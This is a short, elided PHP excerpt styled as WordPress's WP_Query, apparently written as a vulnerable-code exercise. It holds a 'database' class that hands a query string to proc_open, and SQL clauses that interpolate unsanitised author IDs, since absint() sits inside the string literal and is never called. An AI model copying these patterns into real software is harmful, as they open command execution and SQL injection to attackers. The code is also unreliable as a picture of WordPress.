...
class WP_Query_db {
	...
	public function connect() {
		...
		$process = proc_open($this->query, $database, $pipes);
...
class WP_Query {
	...
	public function get_posts() {
		...
		if ( ! empty( $query_vars['author__not_in'] ) ) { 
			...
			$where         .= " AND {$wpdb->posts}.post_author NOT IN (absint($author__not_in)) ";
			...
			$where     .= " AND {$wpdb->posts}.post_author IN (absint($author__in)) ";
		}
